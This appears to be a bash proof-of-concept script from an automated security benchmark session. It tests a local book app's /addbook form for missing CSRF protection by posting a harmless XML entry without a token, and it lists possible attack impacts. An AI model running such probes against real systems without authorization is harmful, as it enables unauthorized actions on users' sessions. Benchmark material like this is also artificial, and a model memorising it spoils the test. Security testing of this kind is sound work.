#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /addbook form by submitting POST request without CSRF token validation
# Target: ./repo
# Created: 2025-12-01T16:04:33.531Z
# Session: benchmark-XBEN-096-24-minc08hf

# CSRF Vulnerability POC - Missing CSRF Token Protection on /addbook Form
# This POC demonstrates that the /addbook endpoint accepts POST requests
# without requiring or validating a CSRF token

TARGET_URL="${1:-http://localhost:5000}"
FORM_ENDPOINT="${TARGET_URL}/addbook"

echo "[*] Testing CSRF Token Protection on /addbook Form"
echo "[*] Target: $FORM_ENDPOINT"
echo ""

# Step 1: Verify the form exists and check for CSRF tokens in the HTML
echo "[+] Step 1: Fetching form HTML to check for CSRF tokens..."
FORM_HTML=$(curl -s "$FORM_ENDPOINT")

# Check for common CSRF token field names
if echo "$FORM_HTML" | grep -q "csrf_token\|_csrf_token\|authenticity_token\|__RequestVerificationToken"; then
    echo "    [!] CSRF token field found in HTML"
    echo "    Form appears to have CSRF protection"
    exit 0
else
    echo "    [+] No CSRF token field detected in form HTML"
fi

# Check for X-CSRF-Token or other headers in response
echo ""
echo "[+] Step 2: Checking response headers for CSRF tokens..."
RESPONSE_HEADERS=$(curl -i -s "$FORM_ENDPOINT" 2>&1)

if echo "$RESPONSE_HEADERS" | grep -qi "X-CSRF-Token\|X-XSRF-Token"; then
    echo "    [!] CSRF token header found in response"
    exit 0
else
    echo "    [+] No CSRF token headers detected in response"
fi

# Step 3: Attempt POST request without CSRF token
echo ""
echo "[+] Step 3: Attempting POST request with XML payload (NO CSRF token)..."

TEST_XML='<Book><Title>CSRF Test</Title><Author>Attacker</Author></Book>'

RESPONSE=$(curl -s -w "\n%{http_code}" -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "xml=${TEST_XML}" \
    "$FORM_ENDPOINT")

# Extract HTTP status code (last line)
HTTP_STATUS=$(echo "$RESPONSE" | tail -n1)
RESPONSE_BODY=$(echo "$RESPONSE" | sed '$d')

echo "    HTTP Status: $HTTP_STATUS"
echo ""

# Step 4: Analyze response
if [ "$HTTP_STATUS" = "200" ] || [ "$HTTP_STATUS" = "302" ]; then
    echo "[+] VULNERABILITY CONFIRMED: Request accepted without CSRF token!"
    echo "    Status Code: $HTTP_STATUS indicates form was processed"
    echo ""
    echo "[+] Attack Impact:"
    echo "    - Attacker can craft malicious requests on behalf of users"
    echo "    - Users visiting malicious sites can be tricked into:"
    echo "      * Uploading malicious XML/XXE payloads"
    echo "      * Adding books to the database"
    echo "      * Performing unintended actions with their session"
    echo ""
    exit 0
elif [ "$HTTP_STATUS" = "403" ]; then
    echo "[-] Request rejected with 403 Forbidden"
    echo "    Possible CSRF protection detected"
    exit 1
else
    echo "    [?] Unexpected status code: $HTTP_STATUS"
    echo "    Response preview:"
    echo "$RESPONSE_BODY" | head -20
    exit 1
fi